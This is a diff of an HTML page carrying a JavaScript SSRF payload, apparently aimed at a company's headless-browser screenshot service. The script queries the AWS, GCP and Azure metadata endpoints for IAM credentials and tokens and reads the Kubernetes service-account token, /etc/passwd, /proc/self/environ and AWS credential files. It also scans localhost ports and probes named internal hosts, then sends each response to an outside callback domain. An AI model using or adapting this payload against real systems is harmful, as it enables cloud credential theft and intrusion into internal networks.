@@ -1,42 +1,34 @@
 <!DOCTYPE html>
 <html>
 <script>
-var CB = 'https://xtugidit39jm7kmw4cl0ut51fslk99.oastify.com'\;
+var CB = 'https://xtugidit39jm7kmw4cl0ut51fslk99.oastify.com';
 
-// Synchronous exfil - blocks until request completes
 function exfil(tag, data) {
   var enc;
   try { enc = btoa(unescape(encodeURIComponent(String(data).slice(0, 3000)))); } catch(e) { enc = 'ERR'; }
-  try {
-    var x = new XMLHttpRequest();
-    x.open('GET', CB + '/x?t=' + encodeURIComponent(tag) + '&d=' + enc, false); // false=sync
-    x.send();
-  } catch(e) {}
+  try { var x = new XMLHttpRequest(); x.open('GET', CB + '/x?t=' + encodeURIComponent(tag) + '&d=' + enc, false); x.send(); } catch(e) {}
 }
 
-// Synchronous probe - returns [status, body] or throws
 function probe(tag, url, headers) {
   try {
     var x = new XMLHttpRequest();
-    x.open('GET', url, false); // synchronous
+    x.open('GET', url, false);
     if (headers) { for (var h in headers) x.setRequestHeader(h, headers[h]); }
     x.send();
-    exfil(tag, 'HTTP ' + x.status + '\n' + x.responseText);
+    exfil(tag, 'HTTP ' + x.status + ' ' + x.responseText);
   } catch(e) {
     exfil(tag + ':ERR', e.message);
   }
 }
 
-exfil('start', 'HeadlessChrome running');
+exfil('start', 'alive');
 
-// ── AWS IMDSv1 ──────────────────────────────────────────────
 probe('aws-root',     'http://169.254.169.254/latest/meta-data/');
 probe('aws-iam-list', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/');
 probe('aws-userdata', 'http://169.254.169.254/latest/user-data');
 probe('aws-hostname', 'http://169.254.169.254/latest/meta-data/hostname');
 probe('aws-region',   'http://169.254.169.254/latest/meta-data/placement/region');
 
-// ── AWS IMDSv2 ───────────────────────────────────────────────
 try {
   var t = new XMLHttpRequest();
   t.open('PUT', 'http://169.254.169.254/latest/api/token', false);
@@ -44,46 +36,29 @@ try {
   t.send();
   var tok = t.responseText;
   exfil('imdsv2-token', tok);
-  probe('imdsv2-iam',  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-        {'X-aws-ec2-metadata-token': tok});
+  probe('imdsv2-iam', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', {'X-aws-ec2-metadata-token': tok});
 } catch(e) { exfil('imdsv2:ERR', e.message); }
 
-// ── GCP metadata ─────────────────────────────────────────────
-probe('gcp-all',   'http://metadata.google.internal/computeMetadata/v1/?recursive=true',
-      {'Metadata-Flavor': 'Google'});
-probe('gcp-token', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
-      {'Metadata-Flavor': 'Google'});
-probe('gcp-169',   'http://169.254.169.254/computeMetadata/v1/?recursive=true',
-      {'Metadata-Flavor': 'Google'});
+probe('gcp-all',   'http://metadata.google.internal/computeMetadata/v1/?recursive=true', {'Metadata-Flavor': 'Google'});
+probe('gcp-token', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {'Metadata-Flavor': 'Google'});
 
-// ── Azure IMDS ───────────────────────────────────────────────
-probe('azure-instance', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
-      {'Metadata': 'true'});
-probe('azure-identity', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
-      {'Metadata': 'true'});
+probe('azure-instance', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {'Metadata': 'true'});
+probe('azure-identity', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', {'Metadata': 'true'});
 
-// ── Kubernetes ───────────────────────────────────────────────
-probe('k8s-ns',      'http://kubernetes.default.svc/api/v1/namespaces/');
-probe('k8s-secrets', 'http://kubernetes.default.svc/api/v1/namespaces/default/secrets/');
-probe('k8s-token',   'file:///var/run/secrets/kubernetes.io/serviceaccount/token');
+probe('k8s-ns',    'http://kubernetes.default.svc/api/v1/namespaces/');
+probe('k8s-token', 'file:///var/run/secrets/kubernetes.io/serviceaccount/token');
 
-// ── Sensitive files ──────────────────────────────────────────
 probe('etc-passwd',   'file:///etc/passwd');
 probe('proc-environ', 'file:///proc/self/environ');
 probe('aws-creds',    'file:///root/.aws/credentials');
 
-// ── Localhost port scan ──────────────────────────────────────
 [80,443,3000,4000,5000,8000,8080,8443,8888,9000,9200,6379,27017,5432,3306,2375].forEach(function(p) {
   probe('lo:' + p, 'http://127.0.0.1:' + p + '/');
 });
 
-// ── Internal Stravito services ───────────────────────────────
-[
-  'https://screenshooter.dev.stravito.com/',
-  'https://internal.api.stravito.com/',
-  'https://internal.stravito.com/',
-  'https://data.dev.stravito.com/'
-].forEach(function(u) { probe('stravito:' + u, u); });
+probe('screenshooter', 'https://screenshooter.dev.stravito.com/');
+probe('internal-api',  'https://internal.api.stravito.com/');
+probe('internal',      'https://internal.stravito.com/');
 
 exfil('done', 'all probes finished');
 </script>
